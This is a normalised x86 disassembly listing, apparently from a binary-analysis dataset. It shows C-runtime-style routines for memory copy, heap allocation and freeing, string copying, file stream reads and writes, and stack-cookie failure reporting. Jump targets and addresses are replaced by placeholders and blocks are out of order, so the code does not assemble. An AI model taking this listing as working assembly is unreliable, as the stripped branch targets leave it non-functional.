je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_40eef8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40f212
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_411970
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40f230
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f204
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_40f24f
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40f43a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_411a6d
pop ecx
test eax eax
je r-xdata
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_410260
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_4112eb
int3
sub_40f29e
push esi
push 0x4
push 0x20
call sub_411ad1
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40f2cd
push 0xc
push r--data
call sub_411bb0
call sub_410916
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40f30d
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f307
mov eax esi
call sub_411bf5
retn
sub_40f30d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_411aa0
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_411b64
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_411b64
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_40f402
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_412060
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_412073
pop ecx
mov [ esi ] eax
pop esi
sub_40f43a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_411a6d
pop ecx
call sub_412060
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_411da5
push 0x1e
call sub_411e02
push 0xff
call sub_4107ab
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_412060
mov [ eax ] ebx
push esi
call sub_411a6d
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_412060
mov [ eax ] ebx
sub_40f4cc
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_412060
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_412060
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
sub_40f538
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_412060
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_412060
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
sub_40f599
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
call sub_41251c
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41225f
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov [ ecx ] bl
mov ecx [ ebp - 0x20 ]
inc ecx
mov [ ebp - 0x20 ] ecx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41225f
pop ecx
pop ecx
mov [ ecx ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
sub_40f688
push 0xc
push r--data
call sub_411bb0
xor ecx ecx
mov [ ebp - 0x1c ] ecx
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
xor eax eax
cmp [ ebx ] cx
setne al
test eax eax
je r-xdata
call sub_411bf5
retn
call sub_41357d
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ edi ] ax
jne r-xdata
call sub_412060
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_413695
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f74a
mov eax edi
call sub_412060
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_413940
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40f752
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_413afc
push esi
mov edi eax
call sub_414a94
push esi
call sub_413a92
push eax
call sub_414930
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_40f402
and [ esi + 0x1c ] 0x0
pop ecx
sub_40f7be
push 0xc
push r--data
call sub_411bb0
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
push esi
call sub_4134a7
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40f752
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f82d
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_411bf5
retn
sub_40f835
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_412060
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
jbe r-xdata
test esi esi
je r-xdata
push [ ebp + 0xc ]
push 0x0
push ecx
call sub_414c70
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
ja r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0xc ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push esi
call sub_414ac4
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
cmp ebx 0x7fffffff
ja r-xdata
xor edx edx
cmp ebx 0x7fffffff
jbe r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] al
inc edx
dec ebx
dec ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax ebx
mov eax ebx
div ecx
mov eax ebx
mov eax 0x7fffffff
div ecx
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
ja r-xdata
mov eax ebx
mov [ ebp - 0x10 ] ebx
call sub_412060
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_414c70
add esp 0xc
push eax
push [ ebp - 0x4 ]
push esi
call sub_413a92
pop ecx
push eax
call sub_413ef3
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push eax
push [ esi ]
push ecx
push [ ebp - 0x4 ]
call sub_414be5
mov eax [ ebp - 0x10 ]
sub [ esi + 0x4 ] eax
add esp 0x10
sub ebx eax
add [ esi ] eax
jmp r-xdata
call sub_412224
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
add [ ebp - 0x4 ] eax
sub [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub ebx eax
test ebx ebx
jne r-xdata
sub_40fa13
push 0xc
push r--data
call sub_411bb0
xor edi edi
mov [ ebp - 0x1c ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
jne r-xdata
push esi
call sub_4134a7
pop ecx
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f835
add esp 0x14
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fa9c
mov eax edi
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_411bf5
retn
call sub_412060
mov [ eax ] 0x16
call sub_412224
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_414c70
add esp 0xc
sub_40faa4
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
xor edx edx
div ecx
cmp ebx eax
ja r-xdata
mov edi ecx
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov edx [ esi + 0xc ]
and edx 0x108
je r-xdata
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_41225f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test edx edx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x4 ] ecx
test ecx ecx
jg r-xdata
mov eax ebx
test ecx ecx
je r-xdata
push esi
call sub_413afc
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
test ebx ebx
jne r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ebx
xor edx edx
div ecx
mov eax ebx
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push [ esi ]
call sub_410c10
mov eax [ ebp - 0x8 ]
sub [ esi + 0x4 ] eax
add [ esi ] eax
add esp 0xc
sub ebx eax
add [ ebp + 0x8 ] eax
jmp r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x8 ]
push esi
call sub_413a92
pop ecx
push eax
call sub_414d00
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] edx
sub ebx edx
cmp eax ecx
jb r-xdata
mov edx eax
sub_40fbfb
push 0xc
push r--data
call sub_411bb0
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov esi [ ebp + 0x14 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_4134a7
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40faa4
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fc71
mov eax edi
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
call sub_411bf5
retn
sub_40fc79
push 0xc
push r--data
call sub_411bb0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
xor eax eax
cmp [ ebx ] al
setne al
test eax eax
je r-xdata
call sub_411bf5
retn
call sub_41357d
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi ] 0x0
jne r-xdata
call sub_412060
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_41560c
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fd35
mov eax edi
call sub_412060
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_413940
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40fd52
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_412060
mov [ eax ] 0x16
call sub_412224
xor eax eax
pop ebp
retn
sub_40fd78
push 0x18
push r--data
call sub_411bb0
mov eax [ ebp + 0x8 ]
mov ebx eax
mov edi eax
mov [ ebp - 0x1c ] edi
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] eax
setge al
test eax eax
je r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
xor eax eax
mov esi [ ebp + 0x10 ]
test esi esi
setne al
test eax eax
je r-xdata
call sub_411bf5
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x20 ] esi
push esi
call sub_4134a7
pop ecx
and [ ebp - 0x4 ] 0x0
test [ esi + 0xc ] 0x40
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_413a92
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40feaf
mov eax edi
dec [ ebp + 0xc ]
je r-xdata
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
mov [ ebx ] 0x0
dec [ esi + 0x4 ]
js r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
xor edi edi
mov [ ebp - 0x1c ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push esi
call sub_414ac4
pop ecx
mov ecx eax
mov eax [ esi ]
movzx ecx [ eax ]
inc eax
mov [ esi ] eax
jmp r-xdata
mov edx rw-data
cmp edx 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
mov [ ebx ] cl
inc ebx
mov [ ebp - 0x28 ] ebx
cmp cl 0xa
jne r-xdata
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x24 ] ecx
cmp ecx 0xffffffff
jne r-xdata
mov eax edx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
test [ edx + 0x24 ] 0x80
je r-xdata
sub_40fec0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_40ff6d
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_412060
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_412060
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
sub_41002b
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_415884
push [ ebp + 0x8 ]
call sub_415bcb
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_415bb6
pop ecx
pop ebp
retn
push 0x1
call sub_415884
pop ecx
sub_410068
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_41002b
leave
retn
push 0x2
pop ecx
int 0x29
sub_41016d
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_41002b
leave
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_41023b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_410301
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41027b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_4102a9
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4102a9
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_41033f
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_410301
